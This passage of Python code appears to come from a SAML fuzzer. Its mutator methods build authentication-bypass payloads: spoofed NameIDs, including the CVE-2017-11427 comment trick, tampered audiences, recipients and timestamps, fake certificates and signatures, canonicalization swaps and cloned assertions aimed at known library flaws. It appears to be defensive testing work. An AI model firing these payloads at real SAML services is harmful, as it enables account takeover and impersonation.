    def _nameid_spoof(self, data: bytearray) -> bytearray | None:
        """NameID value manipulation (S6-2).

        Combined with any signature bypass, changes the identity.
        Also tests comment-in-NameID technique.
        """
        m = _RE_NAMEID.search(data)
        if not m:
            return None
        technique = self.rng.choice([
            # Direct replacement
            lambda: self.rng.choice(EVIL_NAMEIDS),
            # Comment boundary attack (CVE-2017-11427)
            lambda: b"admin@legit.com<!-->.evil.com",
            # Case manipulation
            lambda: b"ADMIN@EXAMPLE.COM",
            # Null byte injection
            lambda: b"admin\x00@example.com",
        ])
        evil = technique()
        return bytearray(
            bytes(data[: m.start(2)]) + evil + bytes(data[m.end(2) :])
        )

    def _audience_bypass(self, data: bytearray) -> bytearray | None:
        """Audience restriction bypass (S6-3)."""
        m = _RE_AUDIENCE.search(data)
        if not m:
            return None
        evil_audience = self.rng.choice([
            b"https://other-sp.example.com",
            b"*",
            b"",
            b"https://sp.example.com/../../admin",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + evil_audience + bytes(data[m.end(2) :])
        )

    def _timestamp_manipulation(self, data: bytearray) -> bytearray | None:
        """Timestamp / expiry manipulation (S6-1)."""
        m = _RE_NOTONORAFTER.search(data)
        if not m:
            return None
        evil_ts = self.rng.choice([
            b"2099-12-31T23:59:59Z",
            b"1970-01-01T00:00:00Z",
            b"",
            b"not-a-timestamp",
        ])
        return bytearray(
            bytes(data[: m.start(2)]) + evil_ts + bytes(data[m.end(2) :])
        )

    # ══════════════════════════════════════════════════════════════
    # S7: Cryptographic Infrastructure
    # ══════════════════════════════════════════════════════════════

    def _golden_saml_self_signed(self, data: bytearray) -> bytearray | None:
        """Self-signed certificate injection (S4-2 / S7-1 pattern).

        Replace KeyInfo with attacker-controlled certificate data.
        Tests whether SP trusts embedded KeyInfo vs. pre-configured cert.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        fake_keyinfo = (
            b"<ds:KeyInfo><ds:X509Data>"
            b"<ds:X509Certificate>FAKE_SELF_SIGNED_CERT_BASE64</ds:X509Certificate>"
            b"</ds:X509Data></ds:KeyInfo>"
        )
        return bytearray(
            bytes(data[: m.start()])
            + fake_keyinfo
            + bytes(data[m.end() :])
        )

    # ══════════════════════════════════════════════════════════════
    # S8: Implementation-Specific Flaws
    # ══════════════════════════════════════════════════════════════

    def _xmlcrypto_firstchild(self, data: bytearray) -> bytearray | None:
        """xml-crypto firstChild navigation bug (S8-2 / SAMLStorm).

        Prepend a comment or PI before the Response element so that
        firstChild points to the wrong node.
        """
        prefix = self.rng.choice([
            b"<!-- evil -->",
            b"<?evil target?>",
            b"<!-- -->\n<!-- -->",
        ])
        m = _RE_RESPONSE_OPEN.search(data)
        if not m:
            return bytearray(prefix + bytes(data))
        return bytearray(
            bytes(data[: m.start()]) + prefix + b"\n" + bytes(data[m.start() :])
        )

    def _samlify_xpath_scope(self, data: bytearray) -> bytearray | None:
        """samlify XPath scope failure (S8-2 / CVE-2025-47949).

        Insert a valid signature from metadata/error response outside
        the assertion scope. samlify validates the signature but doesn't
        check it covers the processed assertion.
        """
        # Strategy: add a second ds:Signature at Response level
        fake_sig = (
            b'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
            b"<ds:SignedInfo>"
            b'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
            b'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
            b'<ds:Reference URI="">'
            b"<ds:DigestMethod "
            b'Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
            b"<ds:DigestValue>AAAA</ds:DigestValue>"
            b"</ds:Reference></ds:SignedInfo>"
            b"<ds:SignatureValue>BBBB</ds:SignatureValue>"
            b"</ds:Signature>"
        )
        m = _RE_RESPONSE_OPEN.search(data)
        if not m:
            return None
        return bytearray(
            bytes(data[: m.end()]) + b"\n" + fake_sig + bytes(data[m.end() :])
        )

    def _rexml_namespace_quirk(self, data: bytearray) -> bytearray | None:
        """REXML xml: prefix namespace quirk (S8-2 / CVE-2025-25292).

        REXML treats xml: prefix as a regular attribute. Adding
        xml:xmlns='...' makes REXML see a different namespace structure
        than Nokogiri/libxml2.
        """
        m = _RE_SIGNATURE_OPEN.search(data)
        if not m:
            return None
        injection = self.rng.choice([
            b' xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
            b' xml:lang="en" xml:xmlns="http://evil.com"',
        ])
        pos = m.end() - 1
        return bytearray(
            bytes(data[:pos]) + injection + bytes(data[pos:])
        )

    def _libxml2_id_caching(self, data: bytearray) -> bytearray | None:
        """libxml2 internal ID caching abuse (S8-1 / CVE-2025-23369).

        Create duplicate ID attributes to confuse libxml2's internal
        caching mechanism for getElementById() lookups.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        tag = bytes(data[m.start() : m.end()])
        # Extract existing ID
        id_match = re.search(rb'ID="([^"]*)"', tag)
        if not id_match:
            return None
        original_id = id_match.group(1)
        # Create a hidden element with the same ID earlier in the document
        decoy = (
            b'<decoy ID="' + original_id + b'" '
            b'xmlns="urn:oasis:names:tc:SAML:2.0:assertion"/>\n'
        )
        r_open = _RE_RESPONSE_OPEN.search(data)
        if not r_open:
            return None
        return bytearray(
            bytes(data[: r_open.end()])
            + b"\n"
            + decoy
            + bytes(data[r_open.end() :])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S2: Encoding & Parser Differential Attacks
    # ══════════════════════════════════════════════════════════════

    def _encoding_bom_injection(self, data: bytearray) -> bytearray | None:
        """BOM injection (S2-NEW). Go rejects UTF-16, libxml2 auto-detects."""
        bom = self.rng.choice(ENCODING_BOMS)
        # Remove existing BOM if present
        cleaned = bytes(data)
        for b in ENCODING_BOMS:
            if cleaned.startswith(b):
                cleaned = cleaned[len(b):]
                break
        return bytearray(bom + cleaned)

    def _encoding_declaration_swap(self, data: bytearray) -> bytearray | None:
        """Replace XML encoding declaration (S2-NEW).

        Mismatched encoding causes different parser behavior: libxml2
        re-encodes, Go encoding/xml rejects non-UTF-8, xmldom ignores.
        """
        decl = self.rng.choice(ENCODING_DECLARATIONS)
        cleaned = bytes(data)
        m = _RE_XML_DECL.search(cleaned)
        if m:
            cleaned = cleaned[:m.start()] + cleaned[m.end():]
        return bytearray(decl + b"\n" + cleaned)

    def _namespace_undeclare(self, data: bytearray) -> bytearray | None:
        """Namespace prefix undeclaration (S2-NEW).

        xmlns:saml="" is invalid in XML 1.0 Namespaces but some parsers
        accept it. Go encoding/xml silently accepts; libxml2 rejects.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        undecl = self.rng.choice(NAMESPACE_UNDECLARATIONS)
        pos = m.end() - 1
        return bytearray(
            bytes(data[:pos]) + b" " + undecl + bytes(data[pos:])
        )

    def _processing_instruction_inject(self, data: bytearray) -> bytearray | None:
        """PI injection inside Signature/Assertion (S2-NEW).

        python3-saml's remove_pis=True parser strips PIs before
        signature verification — proven to cause sig=TRUE.
        """
        pi = self.rng.choice(PI_PAYLOADS)
        target = self.rng.choice([
            _RE_SIGNATURE_OPEN,
            _RE_ASSERTION_OPEN,
        ])
        m = target.search(data)
        if not m:
            return None
        # Insert PI right after the opening tag
        return bytearray(
            bytes(data[:m.end()]) + pi + bytes(data[m.end():])
        )

    def _whitespace_crlf_inject(self, data: bytearray) -> bytearray | None:
        """Whitespace/CRLF/null injection into Base64 values (S2-NEW).

        Base64 decoders handle embedded whitespace differently:
        Go strict, libxml2 lenient, PHP very lenient.
        """
        # Pick a Base64 value element
        target_re = self.rng.choice([
            _RE_SIGNATURE_VALUE,
            _RE_DIGEST_VALUE,
            _RE_X509_CERT,
        ])
        m = target_re.search(data)
        if not m:
            return None
        value = bytes(data[m.start(2):m.end(2)])
        if len(value) < 4:
            return None
        # Insert whitespace at a random position within the value
        ws = self.rng.choice(WHITESPACE_INJECTIONS)
        pos = self.rng.randint(1, len(value) - 1)
        new_value = value[:pos] + ws + value[pos:]
        return bytearray(
            bytes(data[:m.start(2)]) + new_value + bytes(data[m.end(2):])
        )

    def _comment_in_element_name(self, data: bytearray) -> bytearray | None:
        """Comment between namespace prefix and local name (S2-NEW).

        <saml:<!---->Assertion> — most parsers reject but some tokenizers
        handle differently.
        """
        targets = [
            (b"<saml:Assertion", b"<saml:<!---->Assertion"),
            (b"<ds:Signature", b"<ds:<!---->Signature"),
            (b"<saml:NameID", b"<saml:<!---->NameID"),
        ]
        original, replacement = self.rng.choice(targets)
        if original not in bytes(data):
            return None
        result = bytes(data).replace(original, replacement, 1)
        return bytearray(result)

    def _namespace_prefix_remap(self, data: bytearray) -> bytearray | None:
        """Remap saml: prefix to saml2: (S2-NEW).

        Same namespace URI but different prefix. Libraries using
        prefix-based XPath break; local-name-only works fine.
        """
        raw = bytes(data)
        if b"saml:" not in raw:
            return None
        # Replace saml: with saml2: everywhere (but not samlp:)
        result = raw.replace(b"saml:", b"saml2:")
        # Fix saml2p: back to samlp: (we accidentally changed samlp:)
        result = result.replace(b"saml2p:", b"samlp:")
        # Update namespace declaration
        result = result.replace(
            b'xmlns:saml2="',
            b'xmlns:saml2="',
        )
        # Ensure the namespace URI is correct for the new prefix
        if b'xmlns:saml2=' not in result:
            m = _RE_ASSERTION_OPEN.search(result)
            if not m:
                m = re.search(rb"<saml2:Assertion\b[^>]*>", result, re.IGNORECASE | re.DOTALL)
            if m:
                pos = m.end() - 1
                ns_decl = b' xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"'
                result = result[:pos] + ns_decl + result[pos:]
        return bytearray(result)

    # ══════════════════════════════════════════════════════════════
    # NEW S3: Transform & Canonicalization Attacks
    # ══════════════════════════════════════════════════════════════

    def _transform_chain_inject(self, data: bytearray) -> bytearray | None:
        """Inject extra transform into ds:Transforms (S3-NEW).

        XPath filter, inclusive c14n, or base64 transforms create
        different canonicalized output across libraries.
        """
        m = _RE_TRANSFORMS.search(data)
        if not m:
            return None
        extra = self.rng.choice(EXTRA_TRANSFORMS)
        # Insert before </ds:Transforms>
        return bytearray(
            bytes(data[:m.start(3)]) + extra + b"\n" + bytes(data[m.start(3):])
        )

    def _transform_remove_enveloped(self, data: bytearray) -> bytearray | None:
        """Remove enveloped-signature transform (S3-NEW).

        Some libraries still validate without it; others fail. The
        digest computation changes without this transform.
        """
        m = _RE_ENVELOPED_TRANSFORM.search(data)
        if not m:
            return None
        return bytearray(
            bytes(data[:m.start()]) + bytes(data[m.end():])
        )

    def _reference_uri_empty(self, data: bytearray) -> bytearray | None:
        """Set Reference URI to empty or fragment-only (S3-NEW / SAMLStorm).

        Empty URI means "whole document". Different libraries scope
        the signed content differently when URI is empty.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        payload = self.rng.choice([b"", b"#"])
        return bytearray(
            bytes(data[:m.start(2)]) + payload + bytes(data[m.end(2):])
        )

    def _reference_uri_xpointer(self, data: bytearray) -> bytearray | None:
        """Set Reference URI to XPointer syntax (S3-NEW).

        Go encoding/xml has no XPointer support. libxml2 may evaluate
        differently than xmldom.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        payload = self.rng.choice([
            b"xpointer(/)",
            b"xpointer(id('_evil'))",
            b"#_wrong_id",
        ])
        return bytearray(
            bytes(data[:m.start(2)]) + payload + bytes(data[m.end(2):])
        )

    def _c14n_method_swap(self, data: bytearray) -> bytearray | None:
        """Swap CanonicalizationMethod between inclusive/exclusive (S3-NEW).

        Inclusive c14n inherits ancestor namespace context; exclusive
        doesn't. This changes digest computation.
        """
        m = _RE_C14N_METHOD.search(data)
        if not m:
            return None
        algo = self.rng.choice(C14N_ALGORITHMS)
        return bytearray(
            bytes(data[:m.start(2)]) + algo + bytes(data[m.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S4: Signature Infrastructure Attacks
    # ══════════════════════════════════════════════════════════════

    def _duplicate_reference(self, data: bytearray) -> bytearray | None:
        """Duplicate Reference element with different URI (S4-NEW).

        Tests whether libraries validate all references or only first/last.
        """
        m = _RE_REFERENCE_BLOCK.search(data)
        if not m:
            return None
        ref_block = bytes(data[m.start():m.end()])
        # Create a clone with empty URI
        clone = re.sub(rb'URI="[^"]*"', b'URI=""', ref_block)
        # Insert clone after the original
        return bytearray(
            bytes(data[:m.end()]) + b"\n" + clone + bytes(data[m.end():])
        )

    def _keyinfo_confusion(self, data: bytearray) -> bytearray | None:
        """Replace X509Data with KeyValue or empty KeyInfo (S4-NEW).

        Tests whether libraries fall back to embedded key data or
        require pre-configured certificate.
        """
        m = _RE_KEYINFO.search(data)
        if not m:
            return None
        replacement = self.rng.choice([
            b"<ds:KeyInfo><ds:KeyValue><ds:RSAKeyValue>"
            b"<ds:Modulus>AAAA</ds:Modulus>"
            b"<ds:Exponent>AQAB</ds:Exponent>"
            b"</ds:RSAKeyValue></ds:KeyValue></ds:KeyInfo>",
            b"<ds:KeyInfo/>",
            b"",  # remove KeyInfo entirely
        ])
        return bytearray(
            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
        )

    def _signedinfo_manipulation(self, data: bytearray) -> bytearray | None:
        """Manipulate SignedInfo internal structure (S4-NEW).

        Duplicate CanonicalizationMethod, add extra elements, or
        change namespace declaration within SignedInfo.
        """
        m = _RE_SIGNED_INFO.search(data)
        if not m:
            return None
        content = bytes(data[m.start(2):m.end(2)])
        technique = self.rng.choice(["dup_c14n", "extra_elem", "ns_inject"])
        if technique == "dup_c14n":
            cm = _RE_C14N_METHOD.search(content)
            if not cm:
                return None
            dup = content[cm.start():cm.end() + 3]  # include />
            new_content = content[:cm.end() + 3] + b"\n" + dup + content[cm.end() + 3:]
        elif technique == "extra_elem":
            new_content = content + b'<ds:Evil xmlns:ds="http://www.w3.org/2000/09/xmldsig#"/>'
        else:
            new_content = content.replace(
                b"<ds:SignedInfo>",
                b'<ds:SignedInfo xmlns:evil="http://evil.com">',
                1,
            )
            if new_content == content:
                # SignedInfo was already matched at group boundary
                new_content = content + b'<!-- ns inject -->'
        return bytearray(
            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S6: Protocol-Level Attacks
    # ══════════════════════════════════════════════════════════════

    def _issuer_spoof(self, data: bytearray) -> bytearray | None:
        """Issuer value manipulation (S6-NEW).

        Tests whether SPs cross-validate Issuer against IdP metadata.
        """
        m = _RE_ISSUER.search(data)
        if not m:
            return None
        evil = self.rng.choice(EVIL_ISSUERS)
        return bytearray(
            bytes(data[:m.start(2)]) + evil + bytes(data[m.end(2):])
        )

    def _subject_confirmation_bypass(self, data: bytearray) -> bytearray | None:
        """SubjectConfirmation Method/Recipient manipulation (S6-NEW).

        Tests bearer vs holder-of-key confusion and Recipient validation.
        """
        result = bytearray(data)
        m = _RE_SUBJECT_CONFIRMATION.search(result)
        if m:
            method = self.rng.choice(SUBJECT_CONFIRMATION_METHODS)
            result[m.start(2):m.end(2)] = method
        # Also try Recipient manipulation
        mr = _RE_RECIPIENT.search(result)
        if mr and self.rng.random() < 0.6:
            evil_recipient = self.rng.choice([
                b"https://evil-sp.com/acs",
                b"*",
                b"",
            ])
            result[mr.start(2):mr.end(2)] = evil_recipient
        if not m and not mr:
            return None
        return result

    def _condition_manipulation(self, data: bytearray) -> bytearray | None:
        """Condition/timing manipulation (S6-NEW).

        Set NotBefore to future, duplicate AudienceRestriction, or
        remove Conditions entirely.
        """
        technique = self.rng.choice(["notbefore", "audience_dup", "remove"])
        if technique == "notbefore":
            m = _RE_NOTBEFORE.search(data)
            if not m:
                return None
            evil_ts = self.rng.choice([
                b"2099-12-31T23:59:59Z",
                b"1970-01-01T00:00:00Z",
                b"",
            ])
            return bytearray(
                bytes(data[:m.start(2)]) + evil_ts + bytes(data[m.end(2):])
            )
        elif technique == "audience_dup":
            m = _RE_AUDIENCE.search(data)
            if not m:
                return None
            dup = (
                b'<saml:AudienceRestriction>'
                b'<saml:Audience>https://evil-sp.com</saml:Audience>'
                b'</saml:AudienceRestriction>'
            )
            return bytearray(
                bytes(data[:m.end()]) + dup + bytes(data[m.end():])
            )
        else:
            # Remove Conditions block entirely
            raw = bytes(data)
            start = raw.find(b"<saml:Conditions")
            if start == -1:
                return None
            end = raw.find(b"</saml:Conditions>", start)
            if end == -1:
                return None
            end += len(b"</saml:Conditions>")
            return bytearray(raw[:start] + raw[end:])

    def _attribute_injection(self, data: bytearray) -> bytearray | None:
        """Inject extra attributes into AttributeStatement (S6-NEW).

        Tests whether libraries merge or overwrite attributes with
        duplicate names.
        """
        m = _RE_ATTRIBUTE_STATEMENT_CLOSE.search(data)
        if not m:
            return None
        attr = self.rng.choice(EVIL_ATTRIBUTES)
        return bytearray(
            bytes(data[:m.start()]) + attr + b"\n" + bytes(data[m.start():])
        )

    # ══════════════════════════════════════════════════════════════
    # NEW S8: Implementation-Specific
    # ══════════════════════════════════════════════════════════════

    def _assertion_count_bomb(self, data: bytearray) -> bytearray | None:
        """Multiple assertion injection with different NameIDs (S8-NEW).

        3-5 cloned assertions test extraction order across libraries
        more aggressively than single-clone XSW strategies.
        """
        span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not span:
            return None
        count = self.rng.randint(3, 5)
        clones = b""
        for _ in range(count):
            clones += _make_evil_assertion(self.rng) + b"\n"
        return bytearray(
            bytes(data[:span[0]]) + clones + bytes(data[span[0]:])
        )

    def _go_encoding_xml_quirk(self, data: bytearray) -> bytearray | None:
        """Go encoding/xml specific quirks (S8-NEW).

        Target known Go parser behaviors: duplicate attributes (keeps last),
        default namespace injection. These create differentials with libxml2.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        payload, _ = self.rng.choice(GO_QUIRK_PAYLOADS)
        pos = m.end() - 1  # before closing >
        return bytearray(
            bytes(data[:pos]) + payload + bytes(data[pos:])
        )
